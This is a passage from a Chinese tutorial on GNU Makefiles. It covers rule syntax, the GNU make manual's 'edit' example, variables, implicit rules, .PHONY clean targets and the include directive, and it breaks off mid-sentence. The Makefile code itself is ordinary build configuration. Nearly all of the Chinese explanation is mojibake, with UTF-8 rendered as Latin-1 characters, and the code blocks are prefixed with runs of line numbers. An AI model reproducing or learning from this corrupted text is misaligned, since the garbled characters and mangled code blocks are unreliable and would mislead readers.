...:\tprerequisites\t... command 1 #æ³¨æ„å‘½ä»¤å‰è¦ç”¨Tab command 2 ... ... #å¯ä»¥ä½¿ç”¨â€œ\\â€è¡¨ç¤ºç»­è¡Œï¼Œä½†æ˜¯â€œ\\â€ä¹‹åä¸èƒ½æœ‰ç©ºæ ¼     target\nå¯ä»¥æ˜¯ä¸€ä¸ªobject fileï¼ˆç›®æ ‡æ–‡ä»¶ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶ï¼Œè¿˜å¯ä»¥æ˜¯ä¸€ä¸ªæ ‡ç­¾ï¼ˆlabelï¼‰ã€‚å¯¹ äºæ ‡ç­¾è¿™ç§ç‰¹æ€§ï¼Œåœ¨åç»­çš„â€œä¼ªç›®æ ‡â€ç« èŠ‚ä¸­ä¼šæœ‰å™è¿°ã€‚\n  prerequisites\nç”Ÿæˆè¯¥targetæ‰€ä¾èµ–çš„æ–‡ä»¶å’Œ/æˆ–target\n  command\nè¯¥targetè¦æ‰§è¡Œçš„å‘½ä»¤ï¼ˆä»»æ„çš„shellå‘½ä»¤ï¼‰\n  è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶çš„ä¾èµ–å…³ç³»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œtargetè¿™ä¸€ä¸ªæˆ–å¤šä¸ªçš„ç›®æ ‡æ–‡ä»¶ä¾èµ–äºprerequisitesä¸­çš„æ–‡ä»¶ï¼Œ å…¶ç”Ÿæˆè§„åˆ™å®šä¹‰åœ¨commandä¸­ã€‚è¯´ç™½ä¸€ç‚¹å°±æ˜¯è¯´:\nprerequisitesä¸­å¦‚æœæœ‰ä¸€ä¸ªä»¥ä¸Šçš„æ–‡ä»¶æ¯”targetæ–‡ä»¶è¦æ–°çš„è¯ï¼Œcommandæ‰€å®šä¹‰çš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œã€‚\nè¿™å°±æ˜¯Makefileä¸­æœ€æ ¸å¿ƒçš„è§„åˆ™ã€‚\nå®ä¾‹ é‡‡ç”¨GNU make æ‰‹å†Œä¸­çš„ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  edit : main.o kbd.o command.o display.o \\ insert.o search.o files.o utils.o cc -o edit main.o kbd.o command.o display.o \\  insert.o search.o files.o utils.o main.o : main.c defs.h cc -c main.c kbd.o : kbd.c defs.h command.h cc -c kbd.c command.o : command.c defs.h command.h cc -c command.c display.o : display.c defs.h buffer.h cc -c display.c insert.o : insert.c defs.h buffer.h cc -c insert.c search.o : search.c defs.h buffer.h cc -c search.c files.o : files.c defs.h buffer.h command.h cc -c files.c utils.o : utils.c defs.h cc -c utils.c clean : rm edit main.o kbd.o command.o display.o \\  insert.o search.o files.o utils.o   è¯¥å·¥ç¨‹æœ‰3ä¸ªå¤´æ–‡ä»¶å’Œ8ä¸ªcæ–‡ä»¶\nå…¶ä¸­åæ–œæ (â€œ\\â€)æ˜¯æ¢è¡Œç¬¦ï¼Œæ³¨æ„æ¢è¡Œç¬¦ä¹‹åä¸èƒ½ç”¨ç©ºæ ¼ã€‚æ¢è¡Œç¬¦åˆåˆ©ç”¨Makefileçš„é˜…è¯»ã€‚\næŠŠMakefileæ”¾åœ¨å¤„äºå·¥ç¨‹ä¸‹çš„ï¼Œç„¶ååœ¨è¯¥ç›®å½•ä¸‹è¾“å…¥makeå‘½ä»¤ï¼Œå°±å¯ä»¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶äº†ã€‚å¦‚æœè¦åˆ é™¤æ‰§è¡Œæ–‡ä»¶å’Œæ‰€æœ‰çš„ä¸­é—´ç›®æ ‡æ–‡ä»¶ï¼Œé‚£ä¹ˆåªéœ€è¦æ‰§è¡Œmake cleanå°±å¯ä»¥äº†ã€‚\nåœ¨è¿™ä¸ªmakefileä¸­ï¼Œç›®æ ‡æ–‡ä»¶ï¼ˆtargetï¼‰åŒ…å«ï¼šæ‰§è¡Œæ–‡ä»¶editå’Œä¸­é—´ç›®æ ‡æ–‡ä»¶ï¼ˆ *.o ï¼‰ï¼Œä¾èµ–æ–‡ ä»¶ï¼ˆprerequisitesï¼‰å°±æ˜¯å†’å·åé¢çš„é‚£äº› .c æ–‡ä»¶å’Œ .h æ–‡ä»¶ã€‚æ¯ä¸€ä¸ª .o æ–‡ä»¶éƒ½æœ‰ ä¸€ç»„ä¾èµ–æ–‡ä»¶ï¼Œè€Œè¿™äº› .o æ–‡ä»¶åˆæ˜¯æ‰§è¡Œæ–‡ä»¶ edit çš„ä¾èµ–æ–‡ä»¶ã€‚ä¾èµ–å…³ç³»çš„å®è´¨å°±æ˜¯è¯´æ˜äº†ç›® æ ‡æ–‡ä»¶æ˜¯ç”±å“ªäº›æ–‡ä»¶ç”Ÿæˆçš„ï¼Œæ¢è¨€ä¹‹ï¼Œç›®æ ‡æ–‡ä»¶æ˜¯å“ªäº›æ–‡ä»¶æ›´æ–°çš„ã€‚\nè¿™é‡Œè¦è¯´æ˜ä¸€ç‚¹çš„æ˜¯ï¼Œ clean ä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒåªä¸è¿‡æ˜¯ä¸€ä¸ªåŠ¨ä½œåå­—ï¼Œæœ‰ç‚¹åƒcè¯­è¨€ä¸­çš„labelä¸€ æ ·ï¼Œå…¶å†’å·åä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œé‚£ä¹ˆï¼Œmakeå°±ä¸ä¼šè‡ªåŠ¨å»æ‰¾å®ƒçš„ä¾èµ–æ€§ï¼Œä¹Ÿå°±ä¸ä¼šè‡ªåŠ¨æ‰§è¡Œå…¶åæ‰€å®šä¹‰çš„å‘½ä»¤ã€‚ è¦æ‰§è¡Œå…¶åçš„å‘½ä»¤ï¼Œå°±è¦åœ¨makeå‘½ä»¤åæ˜æ˜¾å¾—æŒ‡å‡ºè¿™ä¸ªlabelçš„åå­—ã€‚è¿™æ ·çš„æ–¹æ³•éå¸¸æœ‰ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€ ä¸ªmakefileä¸­å®šä¹‰ä¸ç”¨çš„ç¼–è¯‘æˆ–æ˜¯å’Œç¼–è¯‘æ— å…³çš„å‘½ä»¤ï¼Œæ¯”å¦‚ç¨‹åºçš„æ‰“åŒ…ï¼Œç¨‹åºçš„å¤‡ä»½ï¼Œç­‰ç­‰ã€‚\nmakeçš„æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š  ä¾æ¬¡è¯»å–å˜é‡â€œMAKEFILESâ€å®šä¹‰çš„makefileæ–‡ä»¶åˆ—è¡¨ è¯»å–å·¥ä½œç›®å½•ä¸‹çš„makefileæ–‡ä»¶ï¼ˆGNU makeçš„é¡ºåºï¼šç¼ºçœçš„æ˜¯æ ¹æ®å‘½åçš„æŸ¥æ‰¾é¡ºåºâ€œGNUmakefileâ€ï¼Œâ€œmakefileâ€ï¼Œâ€œMakefileâ€ï¼Œé¦–å…ˆæ‰¾åˆ°é‚£ä¸ªå°±è¯»å–é‚£ä¸ªï¼ˆå‡å¦‚æ˜¯MAKEFILEï¼Œéœ€è¦ç”¨make -fï¼‰ï¼‰ ä¾æ¬¡è¯»å–å·¥ä½œç›®å½•makefileæ–‡ä»¶ä¸­ä½¿ç”¨æŒ‡ç¤ºç¬¦â€œincludeâ€åŒ…å«çš„æ–‡ä»¶ æŸ¥æ‰¾é‡å»ºæ‰€æœ‰å·²è¯»å–çš„makefileæ–‡ä»¶çš„è§„åˆ™ï¼ˆå¦‚æœå­˜åœ¨ä¸€ä¸ªç›®æ ‡æ˜¯å½“å‰è¯»å–çš„æŸä¸€ä¸ªmakefileæ–‡ä»¶ï¼Œåˆ™æ‰§è¡Œæ­¤è§„åˆ™é‡å»ºæ­¤makefileæ–‡ä»¶ï¼Œå®Œæˆä»¥åä»ç¬¬ä¸€æ­¥å¼€å§‹é‡æ–°æ‰§è¡Œï¼‰ åˆå§‹åŒ–å˜é‡å€¼å¹¶å±•å¼€é‚£äº›éœ€è¦ç«‹å³å±•å¼€çš„å˜é‡å’Œå‡½æ•°å¹¶æ ¹æ®é¢„è®¾æ¡ä»¶ç¡®å®šæ‰§è¡Œåˆ†æ”¯ æ ¹æ®â€œç»ˆæç›®æ ‡â€ä»¥åŠå…¶ä»–ç›®æ ‡çš„ä¾èµ–å…³ç³»å»ºç«‹ä¾èµ–å…³ç³»é“¾è¡¨ æ‰§è¡Œé™¤â€œç»ˆæç›®æ ‡â€ä»¥å¤–çš„æ‰€æœ‰çš„ç›®æ ‡çš„è§„åˆ™ï¼ˆè§„åˆ™ä¸­å¦‚æœä¾èµ–æ–‡ä»¶ä¸­ä»»ä¸€ä¸ªæ–‡ä»¶çš„æ—¶é—´æˆ³æ¯”ç›®æ ‡æ–‡ä»¶æ–°ï¼Œåˆ™ä½¿ç”¨è§„åˆ™æ‰€å®šä¹‰çš„å‘½ä»¤é‡å»ºç›®æ ‡æ–‡ä»¶ï¼‰ æ‰§è¡Œâ€œç»ˆæç›®æ ‡â€æ‰€åœ¨çš„è§„åˆ™  ä¸€ä¸Šé¢é‚£ä¸ªå·¥ç¨‹ä¸ºç¤ºä¾‹ï¼š\nåœ¨é»˜è®¤çš„æ–¹å¼ä¸‹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åªè¾“å…¥ make å‘½ä»¤ã€‚é‚£ä¹ˆï¼Œ 1.makeä¼šåœ¨å½“å‰ç›®å½•ä¸‹æ‰¾åå­—å«â€œMakefileâ€æˆ–â€œmakefileâ€çš„æ–‡ä»¶ã€‚ 2.å¦‚æœæ‰¾åˆ°ï¼Œå®ƒä¼šæ‰¾æ–‡ä»¶ä¸­çš„ç¬¬ä¸€ä¸ªç›®æ ‡æ–‡ä»¶ï¼ˆtargetï¼‰ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œä»–ä¼šæ‰¾åˆ°â€œeditâ€è¿™ä¸ª æ–‡ä»¶ï¼Œå¹¶æŠŠè¿™ä¸ªæ–‡ä»¶ä½œä¸ºæœ€ç»ˆçš„ç›®æ ‡æ–‡ä»¶ã€‚ 3.å¦‚æœeditæ–‡ä»¶ä¸å­˜åœ¨ï¼Œæˆ–æ˜¯editæ‰€ä¾èµ–çš„åé¢çš„ .o æ–‡ä»¶çš„æ–‡ä»¶ä¿®æ”¹æ—¶é—´è¦æ¯” edit è¿™ä¸ª æ–‡ä»¶æ–°ï¼Œé‚£ä¹ˆï¼Œä»–å°±ä¼šæ‰§è¡Œåé¢æ‰€å®šä¹‰çš„å‘½ä»¤æ¥ç”Ÿæˆ edit è¿™ä¸ªæ–‡ä»¶ã€‚ 4.å¦‚æœ edit æ‰€ä¾èµ–çš„ .o æ–‡ä»¶ä¹Ÿä¸å­˜åœ¨ï¼Œé‚£ä¹ˆmakeä¼šåœ¨å½“å‰æ–‡ä»¶ä¸­æ‰¾ç›®æ ‡ä¸º .o æ–‡ä»¶ çš„ä¾èµ–æ€§ï¼Œå¦‚æœæ‰¾åˆ°åˆ™å†æ ¹æ®é‚£ä¸€ä¸ªè§„åˆ™ç”Ÿæˆ .o æ–‡ä»¶ã€‚ï¼ˆè¿™æœ‰ç‚¹åƒä¸€ä¸ªå †æ ˆçš„è¿‡ç¨‹ï¼‰ 5.å½“ç„¶ï¼Œä½ çš„Cæ–‡ä»¶å’ŒHæ–‡ä»¶æ˜¯å­˜åœ¨çš„å•¦ï¼Œäºæ˜¯makeä¼šç”Ÿæˆ .o æ–‡ä»¶ï¼Œç„¶åå†ç”¨ .o æ–‡ä»¶ç”Ÿ æˆmakeçš„ç»ˆæä»»åŠ¡ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œæ–‡ä»¶ edit äº†ã€‚ è¿™å°±æ˜¯æ•´ä¸ªmakeçš„ä¾èµ–æ€§ï¼Œmakeä¼šä¸€å±‚åˆä¸€å±‚åœ°å»æ‰¾æ–‡ä»¶çš„ä¾èµ–å…³ç³»ï¼Œç›´åˆ°æœ€ç»ˆç¼–è¯‘å‡ºç¬¬ä¸€ä¸ªç›®æ ‡æ–‡ä»¶ã€‚åœ¨ æ‰¾å¯»çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå‡ºç°é”™è¯¯ï¼Œæ¯”å¦‚æœ€åè¢«ä¾èµ–çš„æ–‡ä»¶æ‰¾ä¸åˆ°ï¼Œé‚£ä¹ˆmakeå°±ä¼šç›´æ¥é€€å‡ºï¼Œå¹¶æŠ¥é”™ï¼Œè€Œå¯¹äºæ‰€å®šä¹‰çš„å‘½ä»¤çš„é”™è¯¯ï¼Œæˆ–æ˜¯ç¼–è¯‘ä¸æˆåŠŸï¼Œmakeæ ¹æœ¬ä¸ç†ã€‚makeåªç®¡æ–‡ä»¶çš„ä¾èµ–æ€§ã€‚\nåƒ clean è¿™ç§ï¼Œæ²¡æœ‰è¢«ç¬¬ä¸€ä¸ªç›®æ ‡æ–‡ä»¶ç›´æ¥æˆ–é—´æ¥å…³è”ï¼Œé‚£ä¹ˆå®ƒåé¢æ‰€å®šä¹‰çš„å‘½ ä»¤å°†ä¸ä¼šè¢«è‡ªåŠ¨æ‰§è¡Œï¼Œä¸è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥æ˜¾ç¤ºè¦makeæ‰§è¡Œã€‚å³å‘½ä»¤â€”â€” make clean ï¼Œä»¥æ­¤æ¥æ¸…é™¤æ‰€æœ‰ çš„ç›®æ ‡æ–‡ä»¶ï¼Œä»¥ä¾¿é‡ç¼–è¯‘ã€‚\nå¦‚æœè¿™ä¸ªå·¥ç¨‹å·²è¢«ç¼–è¯‘è¿‡äº†ï¼Œå½“æˆ‘ä»¬ä¿®æ”¹äº†å…¶ä¸­ä¸€ä¸ªæºæ–‡ä»¶ï¼Œæ¯”å¦‚ file.c ï¼Œ é‚£ä¹ˆæ ¹æ®æˆ‘ä»¬çš„ä¾èµ–æ€§ï¼Œæˆ‘ä»¬çš„ç›®æ ‡ file.o ä¼šè¢«é‡ç¼–è¯‘ï¼ˆä¹Ÿå°±æ˜¯åœ¨è¿™ä¸ªä¾æ€§å…³ç³»åé¢æ‰€å®šä¹‰çš„å‘½ä»¤ï¼‰ï¼Œ äºæ˜¯ file.o çš„æ–‡ä»¶ä¹Ÿæ˜¯æœ€æ–°çš„å•¦ï¼Œäºæ˜¯ file.o çš„æ–‡ä»¶ä¿®æ”¹æ—¶é—´è¦æ¯” edit è¦æ–°ï¼Œæ‰€ ä»¥ edit ä¹Ÿä¼šè¢«é‡æ–°é“¾æ¥äº†ï¼ˆè¯¦è§ edit ç›®æ ‡æ–‡ä»¶åå®šä¹‰çš„å‘½ä»¤ï¼‰ã€‚æ¯”å¦‚æˆ‘ä»¬æ”¹å˜äº† command.h ï¼Œé‚£ä¹ˆï¼Œ kdb.o ã€ command.o å’Œ files.o éƒ½ ä¼šè¢«é‡ç¼–è¯‘ï¼Œå¹¶ä¸”ï¼Œ edit ä¼šè¢«é‡é“¾æ¥ã€‚\nMakefileä¸­ä½¿ç”¨å˜é‡ æ€»æ‰€å‘¨çŸ¥ï¼Œå˜é‡æ˜¯ä¸ªå¥½ä¸œè¥¿0.0\nåœ¨Makefileä¸­ä½¿ç”¨å˜é‡æœ‰åˆ©äºæˆ‘ä»¬å¯¹å…¶æœ‰æ›´å¥½çš„ç»´æŠ¤æ€§ã€‚\nè·Ÿé€šå¸¸ç¼–ç¨‹ä¸€æ ·ï¼Œå˜é‡åæœ€å¥½ç®€(jian)æ´(dan)æ˜“(cu)æ‡‚(bao)ï¼Œæœ‰åˆ©äºäººä»¬æ˜ç™½å…¶ä»£è¡¨çš„å«ä¹‰ã€‚\nåœ¨ä¸Šé¢ä¾‹å­ä¸­ï¼Œeditåé¢çš„ä¸€ä¸²ä¾¿å¯ä»¥è¿›è¡Œæ›¿ä»£äº†ã€‚\n1 2 3 4  edit : main.o kbd.o command.o display.o \\ insert.o search.o files.o utils.o cc -o edit main.o kbd.o command.o display.o \\  insert.o search.o files.o utils.o   å½“æˆ‘ä»¬éœ€è¦æ·»åŠ æ–‡ä»¶æ—¶ï¼Œéœ€è¦ä¿®æ”¹å¤šä¸ªåœ°æ–¹ï¼Œä½¿ç”¨å˜é‡èƒ½å¾ˆå¥½åœ°ä¸ºæˆ‘ä»¬èŠ‚çœæ—¶é—´ã€‚\nåªéœ€åœ¨å‰é¢å£°æ˜å˜é‡å°±å¥½ï¼Œæ¯”å¦‚objectsï¼Œobjsï¼Œobjç­‰ç­‰ï¼Œåªè¦èƒ½å¾ˆå¥½æ˜ç™½å…¶ä»£è¡¨çš„å«ä¹‰å°±è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  objs = main.o kbd.o command.o display.o \\  insert.o search.o files.o utils.o edit : $(objs) cc -o edit $(objs) main.o : main.c defs.h cc -c main.c kbd.o : kbd.c defs.h command.h cc -c kbd.c command.o : command.c defs.h command.h cc -c command.c display.o : display.c defs.h buffer.h cc -c display.c insert.o : insert.c defs.h buffer.h cc -c insert.c search.o : search.c defs.h buffer.h cc -c search.c files.o : files.c defs.h buffer.h command.h cc -c files.c utils.o : utils.c defs.h cc -c utils.c clean : rm edit $(objs)   æ¯”å¦‚è¿™æ ·ï¼Œå½“æˆ‘ä»¬éœ€è¦æ·»åŠ æ–°çš„ .o æ–‡ä»¶çš„æ—¶å€™ï¼Œåªéœ€è¦ä¿®æ”¹objs =\t... å°±è¡Œäº†\nMakefileçš„è‡ªåŠ¨æ¨å¯¼ GNUçš„makeå¯ä»¥è‡ªåŠ¨æ¨åˆ°æ–‡ä»¶åŠæ–‡ä»¶ä¾èµ–å…³ç³»åé¢çš„å‘½ä»¤ï¼Œäºæ˜¯æˆ‘ä»¬å°±æ²¡å¿…è¦å»åœ¨æ¯ä¸€ä¸ª .o æ–‡ä»¶åéƒ½å†™ä¸Šç±»ä¼¼çš„å‘½ä»¤ï¼Œå› ä¸ºï¼Œæˆ‘ä»¬çš„makeä¼šè‡ªåŠ¨è¯†åˆ«ï¼Œå¹¶è‡ªå·±æ¨å¯¼å‘½ä»¤ã€‚\nåªè¦makeçœ‹åˆ°ä¸€ä¸ª .o æ–‡ä»¶ï¼Œå®ƒå°±ä¼šè‡ªåŠ¨çš„æŠŠ .c æ–‡ä»¶åŠ åœ¨ä¾èµ–å…³ç³»ä¸­ï¼Œå¦‚æœmakeæ‰¾åˆ°ä¸€ä¸ªwhatever.o ï¼Œé‚£ä¹ˆ whatever.c å°±ä¼šæ˜¯ whatever.o çš„ä¾èµ–æ–‡ä»¶ã€‚å¹¶ä¸” cc -c whatever.c ä¹Ÿä¼šè¢«æ¨å¯¼å‡ºæ¥ï¼Œäºæ˜¯ï¼Œæˆ‘ä»¬çš„makefileå†ä¹Ÿä¸ç”¨å†™å¾—è¿™ä¹ˆå¤æ‚ã€‚æˆ‘ä»¬çš„ æ–°makefileåˆå‡ºç‚‰äº†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  objects = main.o kbd.o command.o display.o \\  insert.o search.o files.o utils.o edit : $(objects) cc -o edit $(objects) main.o : defs.h kbd.o : defs.h command.h command.o : defs.h command.h display.o : defs.h buffer.h insert.o : defs.h buffer.h search.o : defs.h buffer.h files.o : defs.h buffer.h command.h utils.o : defs.h .PHONY : clean clean : rm edit $(objects)   è¿™ç§æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯makeçš„â€œéšæ™¦è§„åˆ™â€ã€‚\n.PHONY è¡¨ç¤º clean æ˜¯ä¸ªä¼ªç›®æ ‡ æ–‡ä»¶ã€‚\nå¦ç±»é£æ ¼çš„Makefile æ—¢ç„¶æˆ‘ä»¬çš„makeå¯ä»¥è‡ªåŠ¨æ¨å¯¼å‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘çœ‹åˆ°é‚£å † .o å’Œ .h çš„ä¾èµ–å°±æœ‰ç‚¹ä¸çˆ½ï¼Œé‚£ä¹ˆå¤šçš„ é‡å¤çš„ .h ï¼Œèƒ½ä¸èƒ½æŠŠå…¶æ”¶æ‹¢èµ·æ¥ï¼Œå¥½å§ï¼Œæ²¡æœ‰é—®é¢˜ï¼Œè¿™ä¸ªå¯¹äºmakeæ¥è¯´å¾ˆå®¹æ˜“ï¼Œè°å«å®ƒæä¾›äº†è‡ªåŠ¨ æ¨å¯¼å‘½ä»¤å’Œæ–‡ä»¶çš„åŠŸèƒ½å‘¢ï¼Ÿæ¥çœ‹çœ‹æœ€æ–°é£æ ¼çš„makefileå§ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13  objects = main.o kbd.o command.o display.o \\  insert.o search.o files.o utils.o edit : $(objects) cc -o edit $(objects) $(objects) : defs.h kbd.o command.o files.o : command.h display.o insert.o search.o files.o : buffer.h .PHONY : clean clean : rm edit $(objects)   æ¸…ç©ºç›®æ ‡æ–‡ä»¶çš„è§„åˆ™ æ¯ä¸ªMakefileä¸­éƒ½åº”è¯¥å†™ä¸€ä¸ªæ¸…ç©ºç›®æ ‡æ–‡ä»¶ï¼ˆ .o å’Œæ‰§è¡Œæ–‡ä»¶ï¼‰çš„è§„åˆ™ï¼Œè¿™ä¸ä»…ä¾¿äºé‡ç¼–è¯‘ï¼Œä¹Ÿå¾ˆ åˆ©äºä¿æŒæ–‡ä»¶çš„æ¸…æ´ã€‚\n1 2  clean: rm edit $(objects)   æ›´ä¸ºç¨³å¥çš„åšæ³•æ˜¯ï¼š\n1 2 3  .PHONY : clean clean : -rm edit $(objects)   å‰é¢è¯´è¿‡ï¼Œ .PHONY è¡¨ç¤º clean æ˜¯ä¸€ä¸ªâ€œä¼ªç›®æ ‡â€ã€‚è€Œåœ¨ rm å‘½ä»¤å‰é¢åŠ äº†ä¸€ä¸ªå°å‡å·çš„ æ„æ€å°±æ˜¯ï¼Œä¹Ÿè®¸æŸäº›æ–‡ä»¶å‡ºç°é—®é¢˜ï¼Œä½†ä¸è¦ç®¡ï¼Œç»§ç»­åšåé¢çš„äº‹ã€‚å½“ç„¶ï¼Œ clean çš„è§„åˆ™ä¸è¦æ”¾åœ¨æ–‡ä»¶ çš„å¼€å¤´ï¼Œä¸ç„¶ï¼Œè¿™å°±ä¼šå˜æˆmakeçš„é»˜è®¤ç›®æ ‡ï¼Œç›¸ä¿¡è°ä¹Ÿä¸æ„¿æ„è¿™æ ·ã€‚ä¸æˆæ–‡çš„è§„çŸ©æ˜¯â€”â€”â€œcleanä»æ¥éƒ½æ˜¯æ”¾ åœ¨æ–‡ä»¶çš„æœ€åâ€ã€‚\nMakefileé‡Œæœ‰ä»€ä¹ˆï¼Ÿ Makefileé‡Œä¸»è¦åŒ…å«äº†äº”ä¸ªä¸œè¥¿ï¼šæ˜¾å¼è§„åˆ™ã€éšæ™¦è§„åˆ™ã€å˜é‡å®šä¹‰ã€æ–‡ä»¶æŒ‡ç¤ºå’Œæ³¨é‡Šã€‚\n  æ˜¾å¼è§„åˆ™ã€‚æ˜¾å¼è§„åˆ™è¯´æ˜äº†å¦‚ä½•ç”Ÿæˆä¸€ä¸ªæˆ–å¤šä¸ªç›®æ ‡æ–‡ä»¶ã€‚è¿™æ˜¯ç”±Makefileçš„ä¹¦å†™è€…æ˜æ˜¾æŒ‡å‡ºè¦ç”Ÿæˆçš„ æ–‡ä»¶ã€æ–‡ä»¶çš„ä¾èµ–æ–‡ä»¶å’Œç”Ÿæˆçš„å‘½ä»¤ã€‚\n  éšæ™¦è§„åˆ™ã€‚ç”±äºæˆ‘ä»¬çš„makeæœ‰è‡ªåŠ¨æ¨å¯¼çš„åŠŸèƒ½ï¼Œæ‰€ä»¥éšæ™¦çš„è§„åˆ™å¯ä»¥è®©æˆ‘ä»¬æ¯”è¾ƒç®€ç•¥åœ°ä¹¦å†™ Makefileï¼Œè¿™æ˜¯ç”±makeæ‰€æ”¯æŒçš„ã€‚\n  å˜é‡çš„å®šä¹‰ã€‚åœ¨Makefileä¸­æˆ‘ä»¬è¦å®šä¹‰ä¸€ç³»åˆ—çš„å˜é‡ï¼Œå˜é‡ä¸€èˆ¬éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªæœ‰ç‚¹åƒä½ Cè¯­è¨€ä¸­çš„ å®ï¼Œå½“Makefileè¢«æ‰§è¡Œæ—¶ï¼Œå…¶ä¸­çš„å˜é‡éƒ½ä¼šè¢«æ‰©å±•åˆ°ç›¸åº”çš„å¼•ç”¨ä½ç½®ä¸Šã€‚\n  æ–‡ä»¶æŒ‡ç¤ºã€‚å…¶åŒ…æ‹¬äº†ä¸‰ä¸ªéƒ¨åˆ†ï¼Œä¸€ä¸ªæ˜¯åœ¨ä¸€ä¸ªMakefileä¸­å¼•ç”¨å¦ä¸€ä¸ªMakefileï¼Œå°±åƒCè¯­è¨€ä¸­ çš„includeä¸€æ ·ï¼›å¦ä¸€ä¸ªæ˜¯æŒ‡æ ¹æ®æŸäº›æƒ…å†µæŒ‡å®šMakefileä¸­çš„æœ‰æ•ˆéƒ¨åˆ†ï¼Œå°±åƒCè¯­è¨€ä¸­çš„é¢„ç¼–è¯‘#ifä¸€ æ ·ï¼›è¿˜æœ‰å°±æ˜¯å®šä¹‰ä¸€ä¸ªå¤šè¡Œçš„å‘½ä»¤ã€‚æœ‰å…³è¿™ä¸€éƒ¨åˆ†çš„å†…å®¹ï¼Œæˆ‘ä¼šåœ¨åç»­çš„éƒ¨åˆ†ä¸­è®²è¿°ã€‚\n  æ³¨é‡Šã€‚Makefileä¸­åªæœ‰è¡Œæ³¨é‡Šï¼Œå’ŒUNIXçš„Shellè„šæœ¬ä¸€æ ·ï¼Œå…¶æ³¨é‡Šæ˜¯ç”¨ # å­—ç¬¦ï¼Œè¿™ä¸ªå°± åƒC/C++ä¸­çš„ // ä¸€æ ·ã€‚å¦‚æœä½ è¦åœ¨ä½ çš„Makefileä¸­ä½¿ç”¨ # å­—ç¬¦ï¼Œå¯ä»¥ç”¨åæ–œæ è¿›è¡Œè½¬ä¹‰ï¼Œå¦‚ï¼š \\# ã€‚\nè¿˜æœ‰çš„å°±æ˜¯åœ¨Makefileä¸­çš„å‘½ä»¤ï¼Œå¿…é¡»è¦ä»¥ Tab é”®å¼€å§‹ã€‚\n  Makefileçš„æ–‡ä»¶å å› ä¸ºmakeç¨‹åºå·²è¢«ç”¨æˆ·å¤šæ¬¡é‡/æ”¹å†™ï¼Œå…¶ä¸­åŒ…æ‹¬å‡ æ¬¡ç”¨ç›¸åŒçš„æ–‡ä»¶æ ¼å¼å’Œç®—æ³•åŸç†é‡æ–°ç¼–å†™ï¼Œå¹¶ä¸”ä¾ç…§ä¸åŒéœ€è¦æ·»åŠ äº†ä¸€äº›ä¸å¸¸è§çš„æ”¹è‰¯ã€‚\nç°åœ¨çš„ç‰ˆæœ¬ï¼Œå¤§è‡´æ˜¯ GNU makeï¼ŒBSD makeï¼ŒMicrosoft nmakeã€‚\né»˜è®¤çš„æƒ…å†µä¸‹ï¼Œgnuçš„makeå‘½ä»¤ä¼šåœ¨å½“å‰ç›®å½•ä¸‹æŒ‰é¡ºåºæ‰¾å¯»æ–‡ä»¶åä¸ºâ€œGNUmakefileâ€ã€ â€œmakefileâ€ã€â€œMakefileâ€çš„æ–‡ä»¶ï¼Œæ‰¾åˆ°äº†è§£é‡Šè¿™ä¸ªæ–‡ä»¶ã€‚åœ¨è¿™ä¸‰ä¸ªæ–‡ä»¶åä¸­ï¼Œæœ€å¥½ä½¿ç”¨â€œMakefileâ€ è¿™ä¸ªæ–‡ä»¶åï¼Œå› ä¸ºï¼Œè¿™ä¸ªæ–‡ä»¶åç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºå¤§å†™ï¼Œè¿™æ ·æœ‰ä¸€ç§æ˜¾ç›®çš„æ„Ÿè§‰ã€‚æœ€å¥½ä¸è¦ç”¨â€œGNUmakefileâ€ï¼Œ è¿™ä¸ªæ–‡ä»¶æ˜¯GNUçš„makeè¯†åˆ«çš„ã€‚æœ‰å¦å¤–ä¸€äº›makeåªå¯¹å…¨å°å†™çš„â€œmakefileâ€æ–‡ä»¶åæ•æ„Ÿï¼Œä½†æ˜¯åŸºæœ¬ä¸Šæ¥è¯´ï¼Œ å¤§å¤šæ•°çš„makeéƒ½æ”¯æŒâ€œmakefileâ€å’Œâ€œMakefileâ€è¿™ä¸¤ç§é»˜è®¤æ–‡ä»¶åã€‚\nå½“ç„¶ï¼Œä½ å¯ä»¥ä½¿ç”¨åˆ«çš„æ–‡ä»¶åæ¥ä¹¦å†™Makefileï¼Œæ¯”å¦‚ï¼šâ€œMake.Linuxâ€ï¼Œâ€œMake.Solarisâ€ ï¼Œâ€œMake.AIXâ€ç­‰ï¼Œå¦‚æœè¦æŒ‡å®šç‰¹å®šçš„Makefileï¼Œä½ å¯ä»¥ä½¿ç”¨makeçš„ -f å’Œ --file å‚æ•°ï¼Œ å¦‚ï¼š make -f Make.Linux æˆ– make --file Make.AIX ã€‚\nå¼•ç”¨å…¶ä»–çš„Makefile åœ¨Makefileä½¿ç”¨ include å…³é”®å­—å¯ä»¥æŠŠåˆ«çš„MakefileåŒ…å«è¿›æ¥ï¼Œè¿™å¾ˆåƒCè¯­è¨€çš„ #include ï¼Œè¢«åŒ…å«çš„æ–‡ä»¶ä¼šåŸæ¨¡åŸæ ·çš„æ”¾åœ¨å½“å‰æ–‡ä»¶çš„åŒ…å«ä½ç½®ã€‚ include çš„è¯­æ³•æ˜¯ï¼š\n1  include \u003cfilename\u003e   filename 